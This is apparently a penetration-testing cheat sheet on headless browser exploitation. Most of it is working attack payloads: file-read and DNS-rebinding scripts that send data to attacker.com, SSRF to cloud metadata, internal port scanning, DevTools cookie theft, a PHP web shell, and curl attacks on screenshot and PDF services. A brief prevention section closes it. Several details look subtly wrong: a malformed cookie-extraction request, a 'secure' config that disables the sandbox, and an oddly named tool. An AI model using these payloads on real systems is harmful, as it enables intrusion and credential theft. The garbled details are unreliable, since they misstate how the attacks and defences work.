# Headless Browser Exploitation

## Description
Headless browsers are web browsers without a graphical user interface, often used for automated testing, web scraping, and server-side rendering. When applications use headless browsers to process user-supplied URLs or content, various security vulnerabilities can arise.

## Common Headless Browsers

- Chrome/Chromium (Headless)
- Firefox (Headless)
- PhantomJS (deprecated)
- Puppeteer (Node.js library for Chrome)
- Playwright (Cross-browser automation)
- Selenium WebDriver

## Vulnerability Categories

### 1. Local File Read

When headless browser runs with `--allow-file-access-from-files` flag:

```javascript
// Attacker-controlled page
async function stealFile() {
    const response = await fetch('file:///etc/passwd');
    const content = await response.text();

    // Exfiltrate
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: content
    });
}
stealFile();
```

#### Exploitation via HTML
```html
<html>
<body>
<script>
fetch('file:///etc/passwd')
    .then(r => r.text())
    .then(data => {
        new Image().src = 'https://attacker.com/log?data=' + btoa(data);
    });
</script>
</body>
</html>
```

### 2. Remote Debugging Port

If Chrome runs with `--remote-debugging-port`:

```bash
# Check for exposed debugging port
curl http://localhost:9222/json

# Response includes:
# - Open tabs
# - WebSocket debug URL
# - Page titles and URLs
```

#### Exploitation
```javascript
// Connect to debugging WebSocket
const ws = new WebSocket('ws://localhost:9222/devtools/page/...');

ws.onopen = () => {
    // Execute JavaScript in browser context
    ws.send(JSON.stringify({
        id: 1,
        method: 'Runtime.evaluate',
        params: { expression: 'document.cookie' }
    }));
};
```

#### Extract Cookies
```bash
# Via debugging protocol
curl http://localhost:9222/json/list

# Get all cookies
curl -X POST http://localhost:9222/json/new \
    -d '{"method": "Network.getAllCookies"}'
```

### 3. Server-Side Request Forgery (SSRF)

When headless browser visits user-supplied URL:

```html
<!-- Attacker's page that redirects to internal resources -->
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/">
</head>
</html>
```

#### JavaScript-based SSRF
```javascript
// Fetch internal resources
fetch('http://internal-api.local/admin')
    .then(r => r.text())
    .then(data => {
        // Exfiltrate via DNS
        fetch('https://attacker.com/log?data=' + btoa(data));
    });
```

### 4. Port Scanning

```javascript
// Scan internal network via timing
async function scanPort(host, port) {
    return new Promise((resolve) => {
        const img = new Image();
        const start = Date.now();

        img.onload = img.onerror = () => {
            const time = Date.now() - start;
            resolve({ port, open: time < 100 });
        };

        img.src = `http://${host}:${port}/`;

        setTimeout(() => resolve({ port, open: false }), 1000);
    });
}

// Scan common ports
const ports = [22, 80, 443, 3306, 5432, 6379, 8080];
for (const port of ports) {
    const result = await scanPort('192.168.1.1', port);
    console.log(`Port ${port}: ${result.open ? 'OPEN' : 'closed'}`);
}
```

### 5. DNS Rebinding

Attack flow:
1. Victim's server fetches attacker's URL
2. DNS resolves to attacker's IP
3. Page loads with malicious JavaScript
4. DNS rebinds to internal IP
5. JavaScript accesses internal resources

```javascript
// On attacker's page (after DNS rebind)
setTimeout(() => {
    // Now same-origin with internal service
    fetch('/admin/secrets')
        .then(r => r.json())
        .then(data => {
            navigator.sendBeacon('https://attacker.com/exfil',
                JSON.stringify(data));
        });
}, 5000);  // Wait for DNS rebind
```

### 6. Arbitrary File Write

If headless browser can take screenshots or generate PDFs:

```html
<!-- Generate PDF with malicious content -->
<html>
<body>
<?php system($_GET['cmd']); ?>
</body>
</html>

<!-- Path traversal in output filename -->
<!-- filename=../../../var/www/html/shell.php -->
```

### 7. Browser Exploit (CVE)

Target browser-specific vulnerabilities:

```bash
# V8 engine exploits
# Blink renderer exploits
# WebKit exploits

# Check browser version
# Search for known CVEs
# Apply public exploits
```

## Dangerous Flags

### Chrome/Chromium
```bash
# Dangerous flags that increase attack surface
--no-sandbox                    # Disables sandbox
--disable-web-security          # Disables SOP
--allow-file-access-from-files  # Allow file:// URLs
--remote-debugging-port=9222    # Expose debugging
--disable-setuid-sandbox        # Disable setuid sandbox
```

### Checking for Flags
```bash
# Look for process with flags
ps aux | grep chrome | grep -E "no-sandbox|disable-web-security"
```

## Tools

### WhiteChocolateMacademiaNut
```bash
# https://github.com/nickmakesstuff/nickmakesstuff.github.io
# Browser debugging protocol exploitation

# Connect to debugging port
wchocolate http://localhost:9222
```

### Puppeteer Exploitation
```javascript
// If you can control Puppeteer script
const browser = await puppeteer.launch({
    args: ['--no-sandbox', '--disable-setuid-sandbox']
});

const page = await browser.newPage();

// SSRF
await page.goto('http://169.254.169.254/');

// File read
await page.goto('file:///etc/passwd');
```

## Exploitation Scenarios

### Screenshot Service
```bash
# Service: Takes URL, returns screenshot
# Attack: Provide URL that loads malicious JS
curl "https://screenshot-service.com/capture?url=https://attacker.com/exploit.html"
```

### PDF Generation
```bash
# Service: Converts HTML to PDF
# Attack: Include server-side includes or local files
curl -X POST "https://pdf-service.com/convert" \
    -d '{"html": "<iframe src=\"file:///etc/passwd\"></iframe>"}'
```

### Web Archive/Crawling
```bash
# Service: Archives web pages
# Attack: Provide URL that triggers SSRF/file read
curl "https://archive-service.com/save?url=https://attacker.com/redirect-to-internal"
```

## Prevention

### Secure Configuration
```javascript
// Puppeteer secure config
const browser = await puppeteer.launch({
    args: [
        '--no-sandbox',  // Only if absolutely necessary
        '--disable-dev-shm-usage',
        '--disable-extensions',
        '--disable-gpu'
    ],
    // Don't allow file:// URLs
    ignoreHTTPSErrors: false
});
```

### Network Isolation
```
1. Run headless browser in isolated network
2. Block access to internal resources
3. Use firewall rules to limit outbound connections
4. Implement URL allowlisting
```

### Input Validation
```javascript
function validateURL(url) {
    const parsed = new URL(url);

    // Block dangerous schemes
    if (['file:', 'javascript:', 'data:'].includes(parsed.protocol)) {
        throw new Error('Invalid URL scheme');
    }

    // Block internal IPs
    const ip = parsed.hostname;
    if (isInternalIP(ip)) {
        throw new Error('Internal IP not allowed');
    }

    return url;
}
```

## Testing Checklist

- [ ] Check for exposed debugging ports
- [ ] Test for file:// URL access
- [ ] Test SSRF via URL parameter
- [ ] Check browser version for CVEs
- [ ] Test DNS rebinding attack
- [ ] Check for dangerous command-line flags
- [ ] Test port scanning capability
- [ ] Check network isolation

## References
- https://github.com/nickmakesstuff/PayloadsAllTheThings/tree/master/Headless%20Browser
- https://pptr.dev/
- https://developer.chrome.com/docs/devtools/remote-debugging/
